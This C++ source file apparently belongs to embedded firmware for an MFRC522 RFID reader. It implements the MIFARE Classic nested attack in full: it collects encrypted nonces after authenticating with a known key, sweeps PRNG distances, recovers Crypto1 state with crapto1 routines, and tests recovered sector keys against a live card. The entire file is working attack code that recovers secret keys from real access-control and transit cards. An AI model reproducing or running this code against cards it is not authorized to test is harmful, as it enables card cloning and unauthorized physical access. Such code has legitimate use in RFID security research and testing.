#include "NestedAttack.h"

extern "C" {
#include "utils/crypto/crapto1.h"
}

#include <cstring>

// ===================== Low-level helpers =====================

static uint8_t oddparity(uint8_t bt)
{
  return (0x9669 >> ((bt ^ (bt >> 4)) & 0xF)) & 1;
}

static uint64_t bytesToInt(const uint8_t* buf, uint8_t len)
{
  uint64_t nr = 0;
  for (int i = 0; i < len; i++) nr = (nr << 8) | buf[i];
  return nr;
}

static void calcCRC(const uint8_t* data, uint8_t len, uint8_t* crc)
{
  uint32_t wCrc = 0x6363;
  for (uint8_t i = 0; i < len; i++) {
    uint8_t bt = data[i];
    bt = (bt ^ (uint8_t)(wCrc & 0xFF));
    bt = (bt ^ (bt << 4));
    wCrc = (wCrc >> 8) ^ ((uint32_t)bt << 8) ^ ((uint32_t)bt << 3) ^ ((uint32_t)bt >> 4);
  }
  crc[0] = (uint8_t)(wCrc & 0xFF);
  crc[1] = (uint8_t)((wCrc >> 8) & 0xFF);
}

static uint8_t makeRawFrame(uint8_t* data, uint8_t dataLen, uint8_t* parBits, uint8_t* pkt)
{
  pkt[0] = data[0];
  pkt[1] = (parBits[0] | (data[1] << 1));
  int i;
  for (i = 2; i < dataLen; i++) {
    pkt[i]  = (parBits[i-1] << (i-1)) | (data[i-1] >> (9-i));
    pkt[i] |= (data[i] << i);
  }
  pkt[dataLen] = (parBits[dataLen-1] << (i-1)) | (data[dataLen-1] >> (9-i));
  return dataLen % 8;
}

static void extractData(uint8_t* pkt, uint8_t len, uint8_t* parBits, uint8_t* data)
{
  data[0] = pkt[0];
  int i;
  for (i = 1; i < len-1; i++) {
    parBits[i-1] = (pkt[i] & (1 << (i-1))) >> (i-1);
    data[i] = (pkt[i] >> i) | (pkt[i+1] << (8-i));
  }
  parBits[i-1] = (pkt[i] & (1 << (i-1))) >> (i-1);
}

static void parityOff(MFRC522_I2C* m) { m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x10); }
static void parityOn(MFRC522_I2C* m)  { m->PCD_WriteRegister(MFRC522_I2C::MfRxReg, 0x00); }

static void resetPICC(MFRC522_I2C* m)
{
  m->PCD_StopCrypto1();
  m->PCD_AntennaOff(); delay(50); m->PCD_AntennaOn(); delay(50);
}

static bool initCom(MFRC522_I2C* m)
{
  for (int attempt = 0; attempt < 20; attempt++) {
    delay(10);
    uint8_t buf[2]; uint8_t bufSize = sizeof(buf);
    if (m->PICC_RequestA(buf, &bufSize) != MFRC522_I2C::STATUS_OK) continue;
    if (m->PICC_Select(&m->uid) != MFRC522_I2C::STATUS_OK) continue;
    return true;
  }
  return false;
}

static bool piccIO(MFRC522_I2C* m, uint8_t cmd, uint8_t sendLen,
                   uint8_t* data, uint8_t bufLen, uint8_t validBits = 0)
{
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, MFRC522_I2C::PCD_Idle);
  m->PCD_WriteRegister(MFRC522_I2C::ComIrqReg, 0x7F);
  m->PCD_WriteRegister(MFRC522_I2C::FIFOLevelReg, 0x80);
  m->PCD_WriteRegister(MFRC522_I2C::FIFODataReg, sendLen, data);
  m->PCD_WriteRegister(MFRC522_I2C::BitFramingReg, validBits);
  m->PCD_WriteRegister(MFRC522_I2C::CommandReg, cmd);
  if (cmd == MFRC522_I2C::PCD_Transceive)
    m->PCD_SetRegisterBitMask(MFRC522_I2C::BitFramingReg, 0x80);
  uint8_t finishFlag = (cmd == MFRC522_I2C::PCD_Transceive ||
                        cmd == MFRC522_I2C::PCD_Receive) ? 0x30 : 0x10;
  for (int wd = 3000; wd > 0; --wd) {
    uint8_t irq = m->PCD_ReadRegister(MFRC522_I2C::ComIrqReg);
    if (irq & finishFlag) break;
    if (irq & 0x01 || wd == 1) return false;
  }
  uint8_t err = m->PCD_ReadRegister(MFRC522_I2C::ErrorReg);
  if (err & 0x11) return false;
  if (cmd == MFRC522_I2C::PCD_Transceive || cmd == MFRC522_I2C::PCD_Receive) {
    uint8_t n = m->PCD_ReadRegister(MFRC522_I2C::FIFOLevelReg);
    if (n > bufLen) return false;
    m->PCD_ReadRegister(MFRC522_I2C::FIFODataReg, n, data);
  }
  return true;
}

static bool verifyKey(MFRC522_I2C* module, uint8_t authCmd, uint8_t blockAddr,
                      uint64_t candidateKey)
{
  MFRC522_I2C::MIFARE_Key mfKey;
  for (int i = 5; i >= 0; i--) {
    mfKey.keyByte[i] = (uint8_t)(candidateKey & 0xFF);
    candidateKey >>= 8;
  }
  parityOn(module);
  resetPICC(module);
  if (!initCom(module)) return false;
  uint8_t status = module->PCD_Authenticate(authCmd, blockAddr, &mfKey, &module->uid);
  module->PCD_StopCrypto1();
  return (status == MFRC522_I2C::STATUS_OK);
}

static uint8_t isNonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, uint8_t* par)
{
  return ((oddparity((Nt >> 24) & 0xFF) == ((par[0]) ^ oddparity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) &
          (oddparity((Nt >> 16) & 0xFF) == ((par[1]) ^ oddparity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1,  8))) &
          (oddparity((Nt >>  8) & 0xFF) == ((par[2]) ^ oddparity((NtEnc >>  8) & 0xFF) ^ BIT(Ks1,  0)))) ? 1 : 0;
}

// ===================== Nested nonce collection =====================

struct NestedSample {
  uint32_t nt1;    // plaintext nonce from exploit sector auth
  uint32_t encNt2; // encrypted nonce from target sector
  uint8_t par[3];  // parity bits of encNt2
};

static bool collectNestedSample(MFRC522_I2C* module, uint32_t uid,
                                 uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
                                 uint8_t targetCmd, uint8_t targetBlock,
                                 NestedSample* out,
                                 NestedAttack::ProgressFn progress)
{
  uint8_t pkt[9], par[8], data[8];
  char msg[48];

  parityOff(module);

  // Step 1: Send auth command for exploit block → receive plain Nt1
  uint8_t cmd[4];
  cmd[0] = authCmd; cmd[1] = exploitBlock;
  calcCRC(cmd, 2, &cmd[2]);
  for (int i = 0; i < 4; i++) par[i] = oddparity(cmd[i]);
  uint8_t vb = makeRawFrame(cmd, 4, par, pkt);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    if (progress) progress("S1 fail: auth cmd piccIO", 10);
    parityOn(module); return false;
  }
  extractData(pkt, 5, par, data);
  uint32_t nt1 = (uint32_t)bytesToInt(data, 4);
  out->nt1 = nt1;

  // Step 2: Init keystream with known key and Nt1
  Crypto1State* ks = crypto1_create(knownKey);
  crypto1_word(ks, nt1 ^ uid, 0);

  // Step 3: Encrypt reader nonce (zeros) and reader answer
  uint8_t n_R[4] = {0};
  for (int i = 0; i < 4; i++) {
    data[i] = crypto1_byte(ks, n_R[i], 0) ^ n_R[i];
    par[i]  = filter(ks->odd) ^ oddparity(n_R[i]);
  }
  uint32_t n_T = prng_successor(nt1, 32);
  for (int i = 4; i < 8; i++) {
    n_T = prng_successor(n_T, 8);
    uint8_t ar_byte = (uint8_t)(n_T & 0xFF);
    data[i] = crypto1_byte(ks, ar_byte, 0) ^ ar_byte;
    par[i]  = filter(ks->odd) ^ oddparity(n_T);
  }

  vb = makeRawFrame(data, 8, par, pkt);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 9, pkt, 9, vb)) {
    if (progress) progress("S3 fail: reader rsp piccIO", 10);
    parityOn(module); crypto1_destroy(ks); return false;
  }

  // Step 4: Verify tag answer
  extractData(pkt, 5, par, data);
  uint32_t a_T_raw = (uint32_t)bytesToInt(data, 4);
  uint32_t expected_n_T = prng_successor(n_T, 32);
  uint32_t a_T = crypto1_word(ks, 0x00, 0) ^ a_T_raw;
  if (a_T != (expected_n_T & 0xFFFFFFFF)) {
    if (progress) {
      snprintf(msg, sizeof(msg), "S4 fail: aT=%08lX exp=%08lX",
               (unsigned long)a_T, (unsigned long)expected_n_T);
      progress(msg, 10);
    }
    parityOn(module); crypto1_destroy(ks); return false;
  }

  // Step 5: Send encrypted auth for TARGET block
  uint8_t unenc[4];
  unenc[0] = targetCmd; unenc[1] = targetBlock;
  calcCRC(unenc, 2, &unenc[2]);
  for (int i = 0; i < 4; i++) {
    data[i] = crypto1_byte(ks, 0x00, 0) ^ unenc[i];
    par[i]  = filter(ks->odd) ^ oddparity(unenc[i]);
  }
  vb = makeRawFrame(data, 4, par, pkt);
  if (!piccIO(module, MFRC522_I2C::PCD_Transceive, 5, pkt, 9, vb)) {
    if (progress) progress("S5 fail: nested auth piccIO", 10);
    crypto1_destroy(ks); parityOn(module); return false;
  }
  crypto1_destroy(ks);

  // Step 6: Extract encrypted nested nonce
  extractData(pkt, 5, par, data);
  out->encNt2 = (uint32_t)bytesToInt(data, 4);
  for (int i = 0; i < 3; i++)
    out->par[i] = (oddparity(data[i]) != par[i]);

  parityOn(module);
  return true;
}

// ===================== Public API =====================

NestedAttack::Result NestedAttack::crack(
    MFRC522_I2C* module, uint32_t uid,
    uint8_t authCmd, uint8_t exploitBlock, uint64_t knownKey,
    uint8_t targetCmd, uint8_t targetBlock,
    ProgressFn progress)
{
  Result result;

  // Collection: silent retries — only the final summary line is emitted so the
  // log doesn't thrash on slow MFRC522 I2C buses (each progress call triggers
  // a screen redraw on the caller side).
  static constexpr int COLLECT_NR = 3;
  static constexpr int MAX_ATTEMPTS = COLLECT_NR * 4;
  NestedSample samples[COLLECT_NR];
  int collected = 0;

  if (progress && !progress("Collecting nonces...", 10)) return result;

  for (int attempt = 0; attempt < MAX_ATTEMPTS && collected < COLLECT_NR; attempt++) {
    resetPICC(module);
    if (!initCom(module)) continue;
    if (collectNestedSample(module, uid, authCmd, exploitBlock, knownKey,
                             targetCmd, targetBlock, &samples[collected], progress)) {
      collected++;
    }
  }

  if (collected == 0) {
    if (progress) progress("No nonces collected", 10);
    return result;
  }

  if (progress) {
    char msg[48];
    snprintf(msg, sizeof(msg), "Collected %d/%d, searching d...", collected, COLLECT_NR);
    if (!progress(msg, 40)) return result;
  }

  // Enumerate all 65535 PRNG distances between exploit Nt1 and target Nt2.
  // Match details are summarized into one tick line every 8000 iterations
  // instead of fired per-match (which previously emitted "Recovering key..."
  // + "Verifying candidates..." for every parity-passing distance).
  uint32_t lastTick = 0;
  int matches = 0, recoveries = 0;
  for (uint32_t d = 0; d < 65535; d++) {
    if (progress && (d - lastTick) >= 8000) {
      lastTick = d;
      char msg[48];
      snprintf(msg, sizeof(msg), "d=%lu m=%d r=%d",
               (unsigned long)d, matches, recoveries);
      // Map d into [40..90]% so the bar advances during the sweep.
      int pct = 40 + (int)((d * 50UL) / 65535UL);
      if (!progress(msg, pct)) return result;
    }

    uint32_t nt2_0 = prng_successor(samples[0].nt1, d);
    uint32_t ks1_0 = samples[0].encNt2 ^ nt2_0;

    if (!isNonce(nt2_0, samples[0].encNt2, ks1_0, samples[0].par)) continue;

    // Cross-check with remaining samples (same key K_T → same d relationship)
    bool allMatch = true;
    for (int i = 1; i < collected && allMatch; i++) {
      uint32_t nt2_i = prng_successor(samples[i].nt1, d);
      uint32_t ks1_i = samples[i].encNt2 ^ nt2_i;
      if (!isNonce(nt2_i, samples[i].encNt2, ks1_i, samples[i].par)) allMatch = false;
    }
    if (!allMatch) continue;

    matches++;
    Crypto1State* revstate = lfsr_recovery32(ks1_0, nt2_0 ^ uid);
    if (!revstate) continue;
    recoveries++;

    Crypto1State* rs = revstate;
    int checked = 0;
    while (rs->odd != 0 || rs->even != 0) {
      lfsr_rollback_word(rs, nt2_0 ^ uid, 0);
      uint64_t candidateKey;
      crypto1_get_lfsr(rs, &candidateKey);

      // Software cross-check against other samples before touching the card
      bool softMatch = true;
      for (int i = 1; i < collected && softMatch; i++) {
        uint32_t nt2_i = prng_successor(samples[i].nt1, d);
        Crypto1State* test = crypto1_create(candidateKey);
        crypto1_word(test, uid ^ nt2_i, 0);
        uint32_t testKs = crypto1_word(test, 0, 0);
        crypto1_destroy(test);
        if ((samples[i].encNt2 ^ nt2_i) != testKs) softMatch = false;
      }

      if (softMatch) {
        if (verifyKey(module, targetCmd, targetBlock, candidateKey)) {
          result.success = true;
          result.key = candidateKey;
          free(revstate);
          parityOn(module);
          return result;
        }
      }

      rs++;
      checked++;
      if (checked > 100000) break;
    }

    free(revstate);
  }

  parityOn(module);
  return result;
}
